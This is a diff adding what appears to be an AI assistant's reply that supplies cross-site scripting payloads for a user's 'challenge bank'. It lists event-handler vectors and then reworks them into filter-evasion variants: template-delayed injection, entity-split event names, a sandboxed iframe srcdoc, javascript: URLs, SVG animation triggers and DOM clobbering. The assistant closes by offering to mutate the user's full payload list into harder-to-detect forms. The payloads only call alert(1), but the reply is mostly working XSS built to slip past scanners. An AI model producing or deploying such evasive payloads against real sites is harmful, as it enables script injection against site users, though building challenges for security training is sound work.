@@ -1,0 +1,199 @@
+Got it — let’s plug the BruteLogic‑shaped holes so your challenge bank fully spans his public payload spectrum.  
+From the cheat sheetand known BruteLogic Twitter drops, the main missing classes in your current set are **interaction‑driven triggers**, **focus/tabindex pivots**, and **contenteditable surfaces**. Here’s a distilled “gap‑fill” pack you can drop in without duplicating what you already have:
+
+---
+
+## 🖱 Interaction‑Driven Event Vectors
+
+These require human action, so they often evade automated scanners.
+
+- **Mouse events**
+
+  ```html
+  <svg onmousedown="alert(1)">
+    <svg onmouseup="alert(1)">
+      <svg onmousemove="alert(1)">
+        <svg onmouseout="alert(1)">
+          <svg onmouseover="alert(1)">
+            <svg ondblclick="alert(1)">
+              <svg onwheel="alert(1)"></svg>
+            
+  ```
+
+- **Keyboard events**
+
+  ```html
+  <input onkeydown="alert(1)" />
+  <input onkeypress="alert(1)" />
+  <input onkeyup="alert(1)" />
+  ```
+
+- **Clipboard events**
+  ```html
+  <input oncopy="alert(1)" value="copy me" />
+  <input oncut="alert(1)" value="cut me" />
+  <input onpaste="alert(1)" />
+  ```
+
+---
+
+## 🎯 Focus & Tabindex Pivots
+
+Force focus to trigger execution.
+
+- **Autofocus**
+
+  ```html
+  <input autofocus onfocus="alert(1)" />
+  ```
+
+- **Tabindex trap**
+
+  ```html
+  <div tabindex="1" onfocus="alert(1)">focus me</div>
+  ```
+
+- **Hidden autofocus**
+  ```html
+  <input style="opacity:0" autofocus onfocus="alert(1)" />
+  ```
+
+---
+
+## ✏ Contenteditable Surfaces
+
+Filters often ignore these because they’re “safe” containers.
+
+```html
+<div contenteditable onfocus="alert(1)">edit me</div>
+<div contenteditable oninput="alert(1)">type here</div>
+```
+
+---
+
+## 🌀 UI‑Bait Polyglots
+
+Payloads that look like instructions but are functional.
+
+```html
+<a href="#" onclick="alert(1)">Click here!</a>
+<marquee onstart="alert(1)">hover me</marquee>
+```
+
+Right — the gap‑fill set I gave you was meant to _complete_ BruteLogic’s public coverage, but you’re right: most of those are low‑entropy, single‑hop triggers. They’re useful for completeness, but they’re not the kind of multi‑stage, validator‑drift‑bait payloads you and I usually enjoy forging.
+
+If we want **complex** in the BruteLogic‑adjacent space, we can take those “simple” triggers and wrap them in layered evasions, context shifts, and parser confusion so they behave like _ritual puzzles_ rather than textbook examples.
+
+Here’s how I’d evolve them into higher‑order challenges:
+
+---
+
+### 1. **Interaction + Context Break + Encoding Drift**
+
+Instead of a bare `onfocus`, bury it in a CSS‑driven focus trap inside an inert container that only becomes active after a DOM mutation.
+
+```html
+<template id="t">
+  <div style="display:inline-block" tabindex="1" onfocus="alert(1)">x</div>
+</template>
+<script>
+  setTimeout(() => document.body.appendChild(t.content), 500);
+</script>
+```
+
+**Why complex:**
+
+- Requires user interaction _and_ a timed DOM change.
+- Evades static scanners by hiding in `<template>` until runtime.
+
+---
+
+### 2. **Contenteditable + Entity‑Split Event + Zero‑Width Joiners**
+
+```html
+<div contenteditable onfoc&#x75;s="alert(1)">edit me</div>
+```
+
+**Why complex:**
+
+- Event name is entity‑split.
+- Works only when the element is interacted with.
+- Zero‑width joiners can be added to further break naive regex.
+
+---
+
+### 3. **Autofocus Chain via Sandbox Escape**
+
+```html
+<iframe
+  sandbox="allow-scripts"
+  srcdoc="
+  <input autofocus onfocus=parent.alert(1)>
+"
+></iframe>
+```
+
+**Why complex:**
+
+- Requires understanding of sandbox flags.
+- Cross‑frame execution path.
+- Not obvious from static HTML alone.
+
+---
+
+### 4. **Polyglot UI‑Bait + Script Context Injection**
+
+```html
+<a href="javascript:`/*click*/alert(1)`">Click me</a>
+```
+
+**Why complex:**
+
+- Looks like harmless UI bait.
+- Uses backtick template literal to survive HTML‑in‑JS contexts.
+
+---
+
+### 5. **Mouse Event Hidden in SVG Animation**
+
+```html
+<svg width="100" height="100">
+  <circle r="40" cx="50" cy="50" fill="red">
+    <animate
+      attributeName="r"
+      from="40"
+      to="41"
+      dur="1s"
+      repeatCount="indefinite"
+      onbegin="alert(1)"
+    />
+  </circle>
+</svg>
+```
+
+**Why complex:**
+
+- No obvious `onload`/`onerror`.
+- Trigger is tied to animation lifecycle, not page load.
+
+---
+
+### 6. **Keyboard Event + DOM Clobbering**
+
+```html
+<form id="onkeyup"><input /></form>
+<script>
+  document.forms.onkeyup.onkeyup = () => alert(1);
+</script>
+```
+
+**Why complex:**
+
+- Uses DOM clobbering to override a form reference.
+- Execution requires a keypress in the right context.
+
+---
+
+If you want, I can **take your entire master list**, mark the “simple” BruteLogic‑style entries, and then _mutate_ each into a multi‑layered, drift‑resistant variant like these — so your challenge bank stays both complete and genuinely hard. That way, even the “known” payloads become fresh, narratable rituals.
+
+Do you want me to start that mutation pass next?
